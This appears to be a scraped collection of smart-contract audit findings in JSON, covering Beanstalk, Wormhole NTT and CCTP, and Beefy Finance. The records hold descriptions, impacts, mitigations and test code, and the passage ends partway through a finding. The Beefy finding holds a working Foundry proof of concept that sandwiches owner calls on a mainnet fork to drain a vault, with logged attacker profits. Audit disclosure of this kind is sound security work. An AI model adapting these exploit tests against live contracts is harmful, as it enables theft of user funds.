        "const { expect } = require('chai');\nconst { takeSnapshot, revertToSnapshot } = require(\"../utils/snapshot.js\");\nconst { BEAN, BEAN_3_CURVE, UNRIPE_BEAN, UNRIPE_LP, WETH, BEAN_ETH_WELL, PUBLIUS, ETH_USD_CHAINLINK_AGGREGATOR } = require('../utils/constants.js');\nconst { bipSeedGauge } = require('../../scripts/bips.js');\nconst { getBeanstalk } = require('../../utils/contracts.js');\nconst { impersonateBeanstalkOwner, impersonateSigner } = require('../../utils/signer.js');\nconst { ethers } = require('hardhat');\n\nconst { impersonateBean, impersonateEthUsdChainlinkAggregator} = require('../../scripts/impersonate.js');\nlet silo, siloExit, bean\n\nlet grownStalkBeforeUpgrade, grownStalkAfterUpgrade\nlet snapshotId\nlet whitelistedTokenSnapshotBeforeUpgrade, whitelistedTokenSnapshotAfterUpgrade\n\nconst whitelistedTokens = [BEAN, BEAN_3_CURVE, UNRIPE_BEAN, UNRIPE_LP, BEAN_ETH_WELL]\n\nconst whitelistedTokensNames = [\"BEAN\", \"BEAN:3CRV CURVE LP\", \"urBEAN\", \"urBEAN:WETH\", \"BEAN:WETH WELLS LP\"]\nconst beanHolderAddress = \"0xA9Ce5196181c0e1Eb196029FF27d61A45a0C0B2c\"\nlet beanHolder\n\n/**\n * Async function\n * @returns tokenDataSnapshot: Mapping from token address to (name,stemTip)\n */\nconst getTokenDataSnapshot = async()=>{\n  tokenDataSnapshot = new Map()\n\n  for(token of whitelistedTokens){\n    tokenDataSnapshot.set(token,{\n      name: whitelistedTokensNames[whitelistedTokens.indexOf(token)],\n      stemTip: await silo.stemTipForToken(token)\n    })\n  }\n  return tokenDataSnapshot\n}\n\n\n\nconst forkMainnet = async()=>{\n  try {\n    await network.provider.request({\n      method: \"hardhat_reset\",\n      params: [\n        {\n          forking: {\n            jsonRpcUrl: process.env.FORKING_RPC,\n            blockNumber: 18619555-1 //a random semi-recent block close to Grown Stalk Per Bdv pre-deployment\n          },\n        },\n      ],\n    });\n  } catch(error) {\n    console.log('forking error in seed Gauge');\n    console.log(error);\n    return\n  }\n}\n\nconst initializateContractsPointers = async(beanstalkAddress)=>{\n  tokenSilo = await ethers.getContractAt('TokenSilo', beanstalkAddress);\n  seasonFacet = await ethers.getContractAt('ISeasonFacet', beanstalkAddress);\n  siloFacet = await ethers.getContractAt('SiloFacet', beanstalkAddress);\n  silo = await ethers.getContractAt('ISilo', beanstalkAddress);\n  siloExit = await ethers.getContractAt('SiloExit', beanstalkAddress);\n  admin = await ethers.getContractAt('MockAdminFacet', beanstalkAddress);\n  well = await ethers.getContractAt('IWell', BEAN_ETH_WELL);\n  weth = await ethers.getContractAt('IWETH', WETH)\n  bean = await ethers.getContractAt('IBean', BEAN)\n  beanEth = await ethers.getContractAt('IWell', BEAN_ETH_WELL)\n  beanEthToken = await ethers.getContractAt('IERC20', BEAN_ETH_WELL)\n  unripeLp = await ethers.getContractAt('IERC20', UNRIPE_LP)\n  beanMetapool = await ethers.getContractAt('MockMeta3Curve', BEAN_3_CURVE)\n  chainlink = await ethers.getContractAt('MockChainlinkAggregator', ETH_USD_CHAINLINK_AGGREGATOR)\n}\n\nconst impersonateOnchainSmartContracts = async() => {\n  publius = await impersonateSigner(PUBLIUS, true)\n  await impersonateEthUsdChainlinkAggregator()\n  await impersonateBean()\n  owner = await impersonateBeanstalkOwner()\n}\n\nconst deposit = async(signer, tokenDataSnapshot) => {\n  await network.provider.send(\"hardhat_setBalance\", [\n    signer.address,\n    \"0x\"+ethers.utils.parseUnits(\"1000\",18).toString()\n  ]);\n\n\n  beanToDeposit = await bean.balanceOf(signer.address)\n  // console.log(`Beans to deposit: ${ethers.utils.formatUnits(beanToDeposit,6)}`)\n  beanStemTip = tokenDataSnapshot.get(BEAN).stemTip\n  await siloFacet.connect(signer).deposit(BEAN,beanToDeposit,0) // 0 = From.EXTERNAL\n  return await tokenSilo.getDepositId(BEAN, beanStemTip, )\n}\n\ndescribe('Facet upgrade POC', function () {\n  before(async function () {\n\n    // Get users to impersonate\n    [user, user2] = await ethers.getSigners()\n\n    // fork mainnet\n    await forkMainnet()\n\n    // Replace on chain smart contract for testing\n    await impersonateOnchainSmartContracts()\n    beanHolder = await impersonateSigner(beanHolderAddress)\n\n    this.beanstalk = await getBeanstalk()\n\n    await initializateContractsPointers(this.beanstalk.address)\n\n    // Before doing anything we record some state variables that should hold\n    whitelistedTokenSnapshotBeforeUpgrade = await getTokenDataSnapshot()\n\n    // We do a deposit\n    depositId = await deposit(beanHolder,whitelistedTokenSnapshotBeforeUpgrade)\n\n    grownStalkBeforeUpgrade = await siloExit.balanceOfGrownStalk(beanHolder.address,BEAN)\n\n    // seed Gauge\n    await bipSeedGauge(true, undefined, false)\n    console.log(\"BIP-39 initiated\\n\")\n\n    whitelistedTokenSnapshotAfterUpgrade = await getTokenDataSnapshot(silo)\n    grownStalkAfterUpgrade = await siloExit.balanceOfGrownStalk(beanHolder.address,BEAN)\n  });\n\n  beforeEach(async function () {\n    snapshotId = await takeSnapshot()\n  });\n\n  afterEach(async function () {\n    await revertToSnapshot(snapshotId)\n  });\n\n\n  describe('init state POC', async function () {\n\n    it(\"Grown stalk backward compatibility\",async()=>{\n      expect(grownStalkBeforeUpgrade).to.be.eq(grownStalkAfterUpgrade, \"Grown stalk for a deposit after BIP-39 upgrade is not the same than before the upgrade\")\n    })\n\n\n    it('Stem tip backward compatibility',async()=>{\n      expect(whitelistedTokenSnapshotBeforeUpgrade.get(BEAN).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(BEAN).stemTip,\"BEAN stem tip is not the same than after the upgrade\")\n      expect(whitelistedTokenSnapshotBeforeUpgrade.get(BEAN_3_CURVE).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(BEAN_3_CURVE).stemTip,\"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade\")\n      expect(whitelistedTokenSnapshotBeforeUpgrade.get(BEAN_ETH_WELL).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(BEAN_ETH_WELL).stemTip,\"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade\")\n      expect(whitelistedTokenSnapshotBeforeUpgrade.get(UNRIPE_BEAN).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(UNRIPE_BEAN).stemTip,\"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade\")\n      expect(whitelistedTokenSnapshotBeforeUpgrade.get(UNRIPE_LP).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(UNRIPE_LP).stemTip,\"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade\")\n\n    })\n  })\n})\n"
    ],
    "Description": [
        " At the time of a Diamond Proxy upgrade, modified facets are cut by their inclusion in the relevant function within bips.js. are Currently, the bipSeedGauge function appears to be missing FieldFacet, BDVFacet, ConvertFacet, and WhitelistFacet which have all been modified since the previous upgrade. Moreover, the addition of facets with modifications to their libraries has not been taken into account, resulting in multiple issues that break the protocol."
    ],
    "Impact": [
        " At first glance, given that it appears none of these facets or the libraries they use contain significant modifications to the core business logic of Beanstalk, the impact could be considered low. However, given there have been significant alterations to other libraries utilized by multiple facets, this is not the case. One of the more severe issues involves the issuance of significantly increased amounts of Stalk than intended which therefore breaks protocol accounting."
    ],
    "Proof of Concept": [
        " A list of all modified facets can be obtained by running the following command:",
        "Output:",
        "A list of all modified libraries can be obtained by running the following command:",
        "Output:",
        "The following coded proof of concept has been written to demonstrate the broken Stalk accounting:",
        "As is shown by the reverting expectations, failure to add SiloFacet to the upgrade breaks the milestone stem update and the grown stalk accounting.",
        "If the solution for the issue relating to the previous milestone stem being scaled for use with the new gauge point system (which uses untruncated values moving forward) is implemented without updating the SiloFacet, then the previous LibTokenSilo::stemTipForToken implementation is used. This allows deposits performed before the upgrade to receive significantly more grown stalk than intended."
    ],
    "Recommended Mitigation": [
        " Be sure to always add all modified facets and all facets whose library dependencies have been modified to the upgrade script. It is highly recommended to develop an upgrade simulation test suite to catch other similar errors in the upgrade process in the future."
    ]
}
----End JSON----

https://solodit.xyz/issues/setting-a-peer-nttmanager-contract-for-the-same-chain-can-cause-loss-of-user-funds-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        " function testTransferToOwnChain() external {\n    uint16 localChainId = nttManager.chainId();\n    DummyToken token = DummyToken(nttManager.token());\n   uint8 decimals = token.decimals();\n    nttManager.setPeer(localChainId, toWormholeFormat(address(0x999), decimals);\n\n    address user_A = address(uint160(uint256(keccak256(\"user_A\"))));\n    address user_B = address(uint160(uint256(keccak256(\"user_B\"))));\n\n    token.mintDummy(address(user_A), 5 * 10 ** decimals);\n    uint256 outboundLimit = 4 * 10 ** decimals;\n    nttManager.setOutboundLimit(outboundLimit);\n\n    // chk params before transfer\n    IRateLimiter.RateLimitParams memory inboundLimitParams =\n        nttManager.getInboundLimitParams(localChainId);\n    IRateLimiter.RateLimitParams memory outboundLimitParams =\n        nttManager.getOutboundLimitParams();\n\n    assertEq(outboundLimitParams.limit.getAmount(), outboundLimit.trim(decimals, decimals).getAmount());\n    assertEq(outboundLimitParams.currentCapacity.getAmount(), outboundLimit.trim(decimals, decimals).getAmount());\n    assertEq(inboundLimitParams.limit.getAmount(), 0);\n    assertEq(inboundLimitParams.currentCapacity.getAmount(), 0);\n\n    vm.startPrank(user_A);\n    uint256 transferAmount = 3 * 10 ** decimals;\n    token.approve(address(nttManager), transferAmount);\n    nttManager.transfer(transferAmount, localChainId, toWormholeFormat(user_B), false, new bytes(1));\n\n    vm.stopPrank();\n\n\n    // chk params after transfer\n\n    // assert outbound rate limit has decreased\n    outboundLimitParams = nttManager.getOutboundLimitParams();\n    assertEq(\n        outboundLimitParams.currentCapacity.getAmount(),\n        (outboundLimit - transferAmount).trim(decimals, decimals).getAmount()\n    );\n    assertEq(outboundLimitParams.lastTxTimestamp, initialBlockTimestamp);\n\n    // assert inbound rate limit for destination chain is still 0.\n    // the backflow should not override the limit.\n    inboundLimitParams =\n        nttManager.getInboundLimitParams(localChainId);\n\n\n    assertEq(inboundLimitParams.limit.getAmount(), 0);\n    assertEq(inboundLimitParams.currentCapacity.getAmount(), 0);\n}\n\nfunction testSameChainEndToEndTransfer() public {\n    vm.chainId(chainId1);\n\n    // Setting up the transfer\n    DummyToken token1 = DummyToken(nttManagerChain1.token());\n\n    uint8 decimals = token1.decimals();\n    uint256 sendingAmount = 5 * 10 ** decimals;\n    token1.mintDummy(address(userA), 5 * 10 ** decimals);\n    vm.startPrank(userA);\n    token1.approve(address(nttManagerChain1), sendingAmount);\n\n    vm.recordLogs();\n\n    // Send token through standard means (not relayer)\n    {\n\n        uint256 userBalanceBefore = token1.balanceOf(address(userA));\n        nttManagerChain1.transfer(sendingAmount, chainId1, bytes32(uint256(uint160(userB))));\n\n        // Balance check on funds going in and out working as expected\n        uint256 userBalanceAfter = token1.balanceOf(address(userA));\n\n        require(\n            userBalanceBefore - sendingAmount == userBalanceAfter,\n            \"User should have sent tokens\"\n        );\n    }\n\n    vm.stopPrank();\n\n    // Get and sign the log to go down the other pipe. Thank you to whoever wrote this code in the past!\n    Vm.Log[] memory entries = guardian.fetchWormholeMessageFromLog(vm.getRecordedLogs());\n    bytes[] memory encodedVMs = new bytes[](entries.length);\n    for (uint256 i = 0; i < encodedVMs.length; i++) {\n        encodedVMs[i] = guardian.fetchSignedMessageFromLogs(entries[i], chainId1);\n    }\n\n    {\n        uint256 supplyBefore = token1.totalSupply();\n\n        vm.expectRevert(abi.encodeWithSelector(UnexpectedRecipientNttManagerAddress.selector, toWormholeFormat(address(nttManagerChain1)), toWormholeFormat(address(0x999))));\n        wormholeTransceiverChain1.receiveMessage(encodedVMs[0]);\n        uint256 supplyAfter = token1.totalSupply();\n\n        // emit log_named_uint(\"sending amount on chain 1\", sendingAmount);\n        // emit log_named_uint(\"minting amount on chain 1\", supplyAfter - supplyBefore);\n        // // require(supplyAfter > sendingAmount + supplyBefore , \"Supplies dont match\");\n        // // require(token1.balanceOf(userB) == sendingAmount, \"User didn't receive tokens\");\n    }\n}\n"
    ],
    "Description": [
        " The current implementation of NttManager::setPeer allows the owner to set the NTT Manager as a peer for the same chain ID as the current chain. If the NTT Manager owner accidentally (or otherwise) sets an arbitrary address as a peer NttManager address for the same chain, this configuration would allow a user to initiate a transfer with the same target chain as the source chain, but such transfers will not get executed on the target chain (which is same as source chain)."
    ],
    "Impact": [
        " There is a potential loss of funds for the users. Even if the peer is subsequently removed, messages already sent from the source chain can never be executed. Any funds attached to those messages will be stuck in the NttManager contract."
    ],
    "Proof of Concept": [
        " The following test case shows that transactions fail on the destination chain."
    ],
    "Recommended Mitigation": [
        " Using cross-chain infrastructure to make transfers within the same chain makes little sense and can lead to loss of user funds if configured in this way. Consider preventing NTT Manager owners from setting peers for the same chain."
    ],
    "Wormhole Foundation": [
        " Fixed in PR #365."
    ],
    "Cyfrin": [
        " Verified. Validation has been added to prevent the same chain as a peer."
    ]
}
----End JSON----

https://solodit.xyz/issues/lack-of-a-gas-refund-in-the-current-design-can-lead-to-the-overcharging-of-users-and-misaligned-relayer-incentives-that-can-choke-message-execution-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " To understand gas handling, it is important to highlight a few key aspects of the current design:",
        "Based on the two above facts, the following can be deduced:"
    ],
    "Impact": [
        ""
    ],
    "Recommended Mitigation": [
        " In the case of standard relayers, consider a mechanism to refund excess gas to the recipient address on the target chain. DeliveryProvider:: quoteEvmDeliveryPrice  in the core Wormhole codebase returns a targetChainRefundPerUnitGasUnused parameter that is currently unused. Consider using this input to calculate the excess fee that can be refunded to the senders. Doing so will not only save costs for users but also remove any misaligned economic incentives for the relayers."
    ],
    "Wormhole Foundation": [
        " Fixed in PR #326."
    ],
    "Cyfrin": [
        " Verified. Transceivers now receive a refund address, and standard relaying for the WormholeTransceiver now issues refunds."
    ]
}
----End JSON----

https://solodit.xyz/issues/access-controlled-functions-cannot-be-called-when-l2-sequencers-are-down-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " Given that rollups such as Optimism and Arbitrum offer methods for forced transaction inclusion, it is important that the aliased sender address is also checked within access control modifiers when verifying the sender holds a permissioned role to allow the functions to which they are applied to be called even in the event of sequencer downtime. The most pertinent examples include:"
    ],
    "Impact": [
        " Failure to consider the aliased sender address prevents the execution of admin or otherwise permissioned functionality on a chain where transactions are batched by a centralized L2 sequencer. Since this functionality could be time-sensitive, such as the urgent pausing of the protocol or the relaying of NTT messages, this issue has the potential to have a high impact with reasonable likelihood."
    ],
    "Proof of Concept": [
        " While potentially unlikely, a possible scenario could include:"
    ],
    "Recommended Mitigation": [
        " Validation of the sender address against permissioned owner/pauser/relayer roles should also consider the aliased equivalents to allow access-controlled functionality to be executed via forced inclusion. Another relevant precaution for the exploit case described above is to reduce the inbound rate limit of the affected chain to zero, which should work to mitigate this issue so long as the transaction can be successfully executed on the destination (i.e. it is not also an L2 rollup simultaneously experiencing sequencer downtime)."
    ],
    "Wormhole Foundation": [
        " There hasn\u2019t been an extensive L2 sequencer downtime event lasting more than a few hours. We think it\u2019s unlikely an attacker would hold on to a vulnerability to coincide with a downtime event, and we have the rate limiter to cap impact with the assumption the downtime doesn\u2019t last longer than a few hours."
    ],
    "Cyfrin": [
        " Acknowledged.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/redemptions-are-blocked-when-l2-sequencers-are-down-cyfrin-none-cyfrin-wormhole-evm-cctp-v2-1-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// Confirm that the caller is the `mintRecipient` to ensure atomic execution.\nrequire(\n    msg.sender.toUniversalAddress() == deposit.mintRecipient, \"caller must be mintRecipient\"\n);\n"
    ],
    "Description": [
        " Given that rollups such as Optimism and Arbitrum offer methods for forced transaction inclusion, it is important that the aliased sender address is also checked within Logic::redeemTokensWithPayload when verifying the sender is the specified mintRecipient to allow for maximum uptime in the event of sequencer downtime."
    ],
    "Impact": [
        " Failure to consider the aliased mintRecipient address prevents the execution of valid VAAs on a target CCTP domain where transactions are batched by a centralized L2 sequencer. Since this VAA could carry a time-sensitive payload, such as the urgent cross-chain liquidity infusion to a protocol, this issue has the potential to have a high impact with reasonable likelihood."
    ],
    "Proof of Concept": [
        ""
    ],
    "Recommended Mitigation": [
        " Validation of the sender address against the mintRecipient should also consider the aliased mintRecipient address to allow for maximum uptime when Logic::redeemTokensWithPayload is called via forced inclusion."
    ],
    "Wormhole Foundation": [
        " Since CCTP doesn\u2019t deal with this aliasing, we don\u2019t feel strongly that we should either."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/loss-of-funds-due-to-malicious-forcing-of-mintrecipient-onto-circle-blacklist-when-cctp-message-is-in-flight-cyfrin-none-cyfrin-wormhole-evm-cctp-v2-1-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " A scenario has been identified in which it may not be possible for the mintRecipient to execute redemption on the target domain due to the actions of a bad actor while an otherwise valid CCTP message is in-flight. It is ostensibly the responsibility of the user to correctly configure the mintRecipient; however, one could reasonably assume the case where an attacker dusts the mintRecipient address with funds stolen in a recent exploit, that may have been deposited to and subsequently withdrawn from an external protocol, or an OFAC-sanctioned token such as TORN, to force this address to become blacklisted by Circle on the target domain while the message is in-flight, thereby causing both the original sender and their intended target recipient to lose access to the tokens.",
        "In the current design, it is not possible to update the mintRecipient for a given deposit due to the multicast nature of VAAs. CCTP exposes MessageTransmitter::replaceMessage which allows the original source caller to update the destination caller for a given message and its corresponding attestation; however, the Wormhole CCTP integration currently provides no access to this function and has no similar functionality of its own to allow updates to the target mintRecipient of the VAA. Without any method for replacing potentially affected VAAs with new VAAs specifying an updated mintRecipient, this could result in permanent denial-of-service on the mintRecipient receiving tokens on the target domain \u2013 the source USDC/EURC will be burnt, but it may be very unlikely that the legitimate recipient is ever able to mint the funds on the destination domain, and once the tokens are burned, there is no path to recovery on the source domain.",
        "This type of scenario is likely to occur primarily where a bad actor intentionally attempts to sabotage a cross-chain transfer of funds that the source caller otherwise expects to be successful. A rational actor would not knowingly attempt a cross-chain transfer to a known blacklisted address, especially if the intended recipient is not a widely-used protocol, which tend to be exempt from sanctions even when receiving funds from a known attacker, but rather an independent EOA. In this case, the destination call to Logic::redeemTokensWithPayload will fail when the CCTP contracts attempt to mint the tokens and can only be retried if the mintRecipient address somehow comes back off the Circle blacklist, the mechanics of which are not overly clear. It is also possible that request(s) made by law-enforcement agencies for the blacklisting of an entire protocol X, as the mint recipient on target domain Y, will cause innocent users to also lose access to their bridged funds.",
        "It is understood that the motivation for restricting message replacement functionality is due to the additional complexity in handling this edge case and ensuring that the VAA of the original message cannot be redeemed with the replaced CCTP attestation, given the additional attack surface. Given that it is not entirely clear how the Circle blacklisting policy would apply in this case, it would be best for someone with the relevant context to aid in making the decision based on this cost/benefit analysis. If it is the case that a victim can be forced onto the blacklist without a clear path to resolution, then this clearly is not ideal. Even if they are eventually able to have this issue resolved, the impact could be time-sensitive in nature, thinking in the context of cross-chain actions that may need to perform some rebalancing/liquidation function, plus a sufficiently motivated attacker could potentially repeatedly front-run any subsequent attempts at minting on the target domain. It is not entirely clear how likely this final point is in practice, once the messages are no longer in-flight and simply ready for execution on the destination, since it is assumed the blacklist would not likely be updated that quickly. In any case, it is agreed that allowing message replacement will add a non-trivial amount of complexity and does indeed increase the attack surface, as previously identified. So depending on how the blacklist is intended to function, it may be worth allowing message replacement, but it is not possible to say with certainty whether this issue is worth addressing."
    ],
    "Impact": [
        " There is only a single address that is permitted to execute a given VAA on the target domain; however, there exists a scenario in which this mintReceipient may be permanently unable to perform redemption due to the malicious addition of this address to the Circle blacklist. In this case, there is a material loss of funds with reasonable likelihood."
    ],
    "Proof of Concept": [
        ""
    ],
    "Recommended Mitigation": [
        " Consider allowing VAAs to be replaced by new VAAs for a given CCTP message and corresponding attestation, so long as they have not already been consumed on the target domain. Alternatively, consider adding an additional Governance action dedicated to the purpose of recovering the USDC burnt by a VAA that has not yet been consumed on the target domain due to malicious blacklisting."
    ],
    "Wormhole Foundation": [
        " Although CCTP has the ability to replace messages, it is also subject to this same issue since the original message recipient can\u2019t be changed."
    ],
    "Cyfrin": [
        " Acknowledged.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-drain-protocol-tokens-by-sandwich-attacking-owner-call-to-setpositionwidth-and-unpause-to-force-redeployment-of-beefys-liquidity-into-an-unfavorable-range-cyfrin-none-cyfrin-beefy-finance-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "pragma solidity 0.8.23;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin-4/contracts/token/ERC20/ERC20.sol\";\nimport {BeefyVaultConcLiq} from \"contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol\";\nimport {BeefyVaultConcLiqFactory} from \"contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol\";\nimport {StrategyPassiveManagerUniswap} from \"contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol\";\nimport {StrategyFactory} from \"contracts/protocol/concliq/uniswap/StrategyFactory.sol\";\nimport {StratFeeManagerInitializable} from \"contracts/protocol/beefy/StratFeeManagerInitializable.sol\";\nimport {IStrategyConcLiq} from \"contracts/interfaces/beefy/IStrategyConcLiq.sol\";\nimport {IUniswapRouterV3} from \"contracts/interfaces/exchanges/IUniswapRouterV3.sol\";\n\n// Test WBTC/USDC Uniswap Strategy\ncontract ConLiqWBTCUSDCTest is Test {\n    BeefyVaultConcLiq vault;\n    BeefyVaultConcLiqFactory vaultFactory;\n    StrategyPassiveManagerUniswap strategy;\n    StrategyPassiveManagerUniswap implementation;\n    StrategyFactory factory;\n    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;\n    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;\n    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;\n    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;\n    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;\n    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;\n    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;\n    int24 constant width = 500;\n    address constant user     = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;\n    address constant attacker = address(0x1337);\n    bytes tradePath1;\n    bytes tradePath2;\n    bytes path0;\n    bytes path1;\n\n    function setUp() public {\n        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();\n        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));\n        vault = vaultFactory.cloneVault();\n        implementation = new StrategyPassiveManagerUniswap();\n        factory = new StrategyFactory(keeper);\n\n        address[] memory lpToken0ToNative = new address[](2);\n        lpToken0ToNative[0] = token0;\n        lpToken0ToNative[1] = native;\n\n        address[] memory lpToken1ToNative = new address[](2);\n        lpToken1ToNative[0] = token1;\n        lpToken1ToNative[1] = native;\n\n        uint24[] memory fees = new uint24[](1);\n        fees[0] = 500;\n\n        path0 = routeToPath(lpToken0ToNative, fees);\n        path1 = routeToPath(lpToken1ToNative, fees);\n\n        address[] memory tradeRoute1 = new address[](2);\n        tradeRoute1[0] = token0;\n        tradeRoute1[1] = token1;\n\n        address[] memory tradeRoute2 = new address[](2);\n        tradeRoute2[0] = token1;\n        tradeRoute2[1] = token0;\n\n        tradePath1 = routeToPath(tradeRoute1, fees);\n        tradePath2 = routeToPath(tradeRoute2, fees);\n\n        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(\n            address(vault),\n            unirouter,\n            keeper,\n            strategist,\n            beefyFeeRecipient,\n            beefyFeeConfig\n        );\n\n        factory.addStrategy(\"StrategyPassiveManagerUniswap_v1\", address(implementation));\n\n        address _strategy = factory.createStrategy(\"StrategyPassiveManagerUniswap_v1\");\n        strategy = StrategyPassiveManagerUniswap(_strategy);\n        strategy.initialize(\n            pool,\n            native,\n            width,\n            path0,\n            path1,\n            commonAddresses\n        );\n\n        vault.initialize(address(strategy), \"Moo Vault\", \"mooVault\");\n    }\n\n    // run with:\n    // forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv\n    function test_AttackerDrainsProtocolViaSetPositionWidth() public {\n        // user deposits and beefy sets up its LP position\n        uint256 BEEFY_INIT_WBTC = 10e8;\n        uint256 BEEFY_INIT_USDC = 600000e6;\n        deposit(user, true, BEEFY_INIT_WBTC, BEEFY_INIT_USDC);\n\n        (uint256 beefyBeforeWBTCBal, uint256 beefyBeforeUSDCBal) = strategy.balances();\n\n        // record beefy WBTC & USDC amounts before attack\n        console.log(\"%s : %d\", \"LP WBTC Before Attack\", beefyBeforeWBTCBal); // 999999998\n        console.log(\"%s : %d\", \"LP USDC Before Attack\", beefyBeforeUSDCBal); // 599999999999\n        console.log();\n\n        // attacker front-runs owner call to `setPositionWidth` using\n        // a large amount of USDC to buy all the WBTC. This:\n        // 1) results in Beefy LP having 0 WBTC and lots of USDC\n        // 2) massively pushes up the price of WBTC\n        //\n        // Attacker has forced Beefy to sell WBTC \"low\"\n        uint256 ATTACKER_USDC = 100000000e6;\n        trade(attacker, true, false, ATTACKER_USDC);\n\n        // owner calls `StrategyPassiveManagerUniswap::setPositionWidth`\n        // This is the transaction that the attacker sandwiches. The reason is that\n        // `setPositionWidth` makes Beefy change its LP position. This will\n        // cause Beefy to deploy its USDC at the now much higher price range\n        strategy.setPositionWidth(width);\n\n        // attacker back-runs the sandwiched transaction to sell their WBTC\n        // to Beefy who has deployed their USDC at the inflated price range,\n        // and also sells the rest of their WBTC position to the remaining LPs\n        // unwinding the front-run transaction\n        //\n        // Attacker has forced Beefy to buy WBTC \"high\"\n        trade(attacker, false, true, IERC20(token0).balanceOf(attacker));\n\n        // record beefy WBTC & USDC amounts after attack\n        (uint256 beefyAfterWBTCBal, uint256 beefyAfterUSDCBal) = strategy.balances();\n\n        // beefy has been almost completely drained of WBTC & USDC\n        console.log(\"%s  : %d\", \"LP WBTC After Attack\", beefyAfterWBTCBal); // 2\n        console.log(\"%s  : %d\", \"LP USDC After Attack\", beefyAfterUSDCBal); // 0\n        console.log();\n\n        uint256 attackerUsdcBal = IERC20(token1).balanceOf(attacker);\n        console.log(\"%s  : %d\", \"Attacker USDC profit\", attackerUsdcBal-ATTACKER_USDC);\n\n        // attacker original USDC: 100000000 000000\n        // attacker now      USDC: 101244330 209974\n        // attacker profit = $1,244,330 USDC\n    }\n\n    function test_AttackerDrainsProtocolViaUnpause() public {\n        // user deposits and beefy sets up its LP position\n        uint256 BEEFY_INIT_WBTC = 0;\n        uint256 BEEFY_INIT_USDC = 600000e6;\n        deposit(user, true, BEEFY_INIT_WBTC, BEEFY_INIT_USDC);\n\n        // owner pauses contract\n        strategy.panic(0, 0);\n\n        (uint256 beefyBeforeWBTCBal, uint256 beefyBeforeUSDCBal) = strategy.balances();\n\n        // record beefy WBTC & USDC amounts before attack\n        console.log(\"%s : %d\", \"LP WBTC Before Attack\", beefyBeforeWBTCBal); // 0\n        console.log(\"%s : %d\", \"LP USDC Before Attack\", beefyBeforeUSDCBal); // 599999999999\n        console.log();\n\n        // owner decides to unpause contract\n        //\n        // attacker front-runs owner call to `unpause` using\n        // a large amount of USDC to buy all the WBTC. This:\n        // massively pushes up the price of WBTC\n        uint256 ATTACKER_USDC = 100000000e6;\n        trade(attacker, true, false, ATTACKER_USDC);\n\n        // owner calls `StrategyPassiveManagerUniswap::unpause`\n        // This is the transaction that the attacker sandwiches. The reason is that\n        // `unpause` makes Beefy change its LP position. This will\n        // cause Beefy to deploy its USDC at the now much higher price range\n        strategy.unpause();\n\n        // attacker back-runs the sandwiched transaction to sell their WBTC\n        // to Beefy who has deployed their USDC at the inflated price range,\n        // and also sells the rest of their WBTC position to the remaining LPs\n        // unwinding the front-run transaction\n        //\n        // Attacker has forced Beefy to buy WBTC \"high\"\n        trade(attacker, false, true, IERC20(token0).balanceOf(attacker));\n\n        // record beefy WBTC & USDC amounts after attack\n        (uint256 beefyAfterWBTCBal, uint256 beefyAfterUSDCBal) = strategy.balances();\n\n        // beefy has been almost completely drained of USDC\n        console.log(\"%s  : %d\", \"LP WBTC After Attack\", beefyAfterWBTCBal); // 0\n        console.log(\"%s  : %d\", \"LP USDC After Attack\", beefyAfterUSDCBal); // 126790\n        console.log();\n\n        uint256 attackerUsdcBal = IERC20(token1).balanceOf(attacker);\n        console.log(\"%s  : %d\", \"Attacker USDC profit\", attackerUsdcBal-ATTACKER_USDC);\n        // attacker profit = $548,527 USDC\n    }\n\n    // handlers\n    function deposit(address depositor, bool dealTokens, uint256 token0Amount, uint256 token1Amount) public {\n        vm.startPrank(depositor);\n\n        if(dealTokens) {\n            deal(address(token0), depositor, token0Amount);\n            deal(address(token1), depositor, token1Amount);\n        }\n\n        IERC20(token0).approve(address(vault), token0Amount);\n        IERC20(token1).approve(address(vault), token1Amount);\n\n        uint256 _shares = vault.previewDeposit(token0Amount, token1Amount);\n\n        vault.depositAll(_shares);\n\n        vm.stopPrank();\n    }\n\n    